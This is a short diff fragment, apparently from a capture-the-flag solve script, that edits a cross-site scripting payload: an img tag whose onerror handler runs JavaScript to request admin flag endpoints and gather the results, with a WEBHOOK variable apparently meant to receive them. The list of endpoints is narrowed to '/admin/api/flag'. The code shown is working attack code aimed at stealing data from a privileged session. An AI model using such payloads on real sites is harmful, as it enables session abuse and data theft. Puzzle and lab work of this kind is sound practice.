@@ -18,7 +18,7 @@
             const payload = `<img src=x onerror="
               (async function() {
                 var WEBHOOK = '${WEBHOOK}';
-                var endpoints = ['/api/flag', '/flag', '/admin/api/flag', '/admin/flag', '/api/admin/flag'];
+                var endpoints = ['/admin/api/flag'];
                 var results = [];
                 
                 for (var i = 0; i < endpoints.length; i++) {
